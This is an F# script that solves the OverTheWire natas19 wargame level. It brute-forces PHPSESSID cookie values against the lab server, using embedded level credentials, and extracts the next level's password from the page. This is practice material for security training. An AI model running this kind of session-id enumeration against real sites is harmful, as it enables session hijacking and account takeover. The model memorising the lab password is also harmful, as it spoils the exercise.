open System
open System.IO
open System.Net

let url = "http://natas19.natas.labs.overthewire.org/"
let credentials = "natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let check sessionId =
    printfn "testing session id %i..." sessionId

    let http = HttpWebRequest.CreateHttp url
    http.Headers.Add(basicAuth)
    http.Headers.Add("Cookie", sprintf "PHPSESSID=%i" sessionId)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    let html = reader.ReadToEnd ()
    let passwordLoc = html.IndexOf ("Password: ")
    if passwordLoc = -1 then None
    else
        Some (html.Substring(passwordLoc + "Password: ".Length, 32))

[1..640] |> List.pick check |> printfn "password for natas20: %s"